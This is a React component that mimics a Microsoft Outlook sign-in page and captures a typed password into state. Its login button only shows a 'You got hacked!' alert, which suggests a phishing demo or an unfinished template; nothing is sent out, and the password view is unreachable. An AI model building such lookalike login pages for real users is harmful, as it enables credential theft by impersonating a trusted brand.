import "./assets/app.css";
import logo from "./assets/logo.png"
import {useState} from 'react';
import * as React from "react";
import axios from "axios"
import { BrowserRouter, Routes, Route } from "react-router-dom";

const Dashboard = () => {

  const [window, setWindow] = useState(false)
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")

  const handleNext = () => {
    setWindow(true)
  }

  const handleEmail = (e) => {
    setEmail(e.target.value)
  }

  const handlePassword = (e) => {
    setPassword(e.target.value)
  }

  const handleLogin = (e) => {

    alert("You got hacked!")
  }

  return !window ? (
    
    <div className="App">
      <div id="section_uname" className=" ">
        <h1>Welcome {email}</h1>
      </div>

   
    <footer className="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <span>.&nbsp;.&nbsp;.</span>
    </footer>
    </div>
  ) : (
    <div className="App">

      <section id="section_uname">
        <p>Outlook</p>
        <div className="auth-wrapper">
          <img src={logo} alt="Microsoft" />
          <h2 className="title mb-16 mt-16">Sign in</h2>
          <form>
              <div className="mb-16">
                  <input id="inp_uname" type="password" name="uname" className="input" onChange={handlePassword} value={password} placeholder="Password" />
              </div>
          </form>
          
          <div>
              <button className="btn" onClick={handleLogin} id="btn_next">Login</button>
          </div>
      </div>
      <div className="opts">
          <p className="has-icon mb-0" style={{fontSize: "15px"}}><span className="icon"><img src="assets/key.png" width="30px" /></span> Sign-in options</p>
      </div>
      </section>

    <footer className="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
        <span>.&nbsp;.&nbsp;.</span>
    </footer>
    </div>
  )
}

export default Dashboard;
